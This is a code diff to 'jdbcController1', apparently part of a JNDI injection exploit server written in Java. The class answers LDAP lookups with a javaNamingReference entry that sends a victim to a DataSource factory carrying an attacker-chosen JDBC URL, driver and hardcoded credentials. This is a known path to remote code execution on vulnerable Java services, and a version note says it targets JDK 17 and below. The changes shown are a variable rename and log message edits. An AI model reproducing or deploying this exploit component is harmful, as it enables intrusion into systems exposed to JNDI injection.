@@ -26,13 +26,12 @@ public class jdbcController1 implements LdapController {
         try {
             Entry  e    = new Entry(base);
             String driver = payloadType;
-            String JDBC_URL1 = params[0];
-            System.out.println("JDBC_URL1: " + JDBC_URL1);
+            String JDBC_URL = params[0];
 
             e.addAttribute("objectClass","javaNamingReference");
             e.addAttribute("javaClassName", "javax.sql.DataSource");
             e.addAttribute("javaFactory",factoryType);
-            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL1,"/1/driverClassName/" + driver,"/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");
+            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL,"/1/driverClassName/" + driver,"/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");
 
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -44,7 +43,7 @@ public class jdbcController1 implements LdapController {
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        System.out.println("- JNDI JDBC Refenrence Links ");
+        System.out.println("- JNDI JDBC Refenrence Links Target <= JDK17");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
